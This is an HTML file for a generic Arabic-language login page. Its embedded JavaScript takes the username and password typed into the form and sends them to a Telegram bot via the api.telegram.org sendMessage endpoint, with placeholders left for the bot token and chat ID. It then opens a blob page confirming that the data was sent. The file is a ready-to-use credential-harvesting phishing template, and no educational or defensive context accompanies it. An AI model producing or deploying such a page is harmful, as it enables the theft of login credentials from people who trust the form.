<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>تسجيل الدخول</title>
<style>
  body { font-family: Arial; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; }
  form { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
  input, button { display: block; width: 100%; padding: 10px; margin: 10px 0; }
  button { background: #007bff; color: white; border: none; cursor: pointer; }
  button:hover { background: #0056b3; }
</style>
</head>
<body>
<form id="loginForm">
  <h2>تسجيل الدخول</h2>
  <input type="text" id="username" placeholder="اسم المستخدم" required>
  <input type="password" id="password" placeholder="كلمة المرور" required>
  <button type="submit">تسجيل الدخول</button>
</form>

<script>
const BOT_TOKEN = "ضع_التوكن_هنا";
const CHAT_ID = "ضع_الـChatID_هنا";

document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault();
  let user = document.getElementById('username').value;
  let pass = document.getElementById('password').value;
  let message = `🔐 محاولة تسجيل دخول:\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`;

  // إرسال البيانات إلى تيليجرام
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
  })
  .then(() => {
    // بعد الإرسال، إنشاء صفحة blob وفتحها
    const blobHtml = `
      <!DOCTYPE html>
      <html lang="ar">
      <head>
        <meta charset="UTF-8">
        <title>تم الإرسال</title>
        <style>
          body { font-family: Arial; background: #111827; color: #f1f5f9; display: flex; justify-content: center; align-items: center; height: 100vh; }
          .box { text-align: center; }
          h1 { color: #22c55e; }
        </style>
      </head>
      <body>
        <div class="box">
          <h1>✅ تم إرسال البيانات</h1>
          <p>شكراً لك، تم فتح هذه الصفحة من رابط blob.</p>
        </div>
      </body>
      </html>
    `;
    const blob = new Blob([blobHtml], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    window.open(url, '_blank', 'noopener');
    setTimeout(() => URL.revokeObjectURL(url), 15000);
  })
  .catch(err => alert("حدث خطأ: " + err));
});
</script>
</body>
</html>
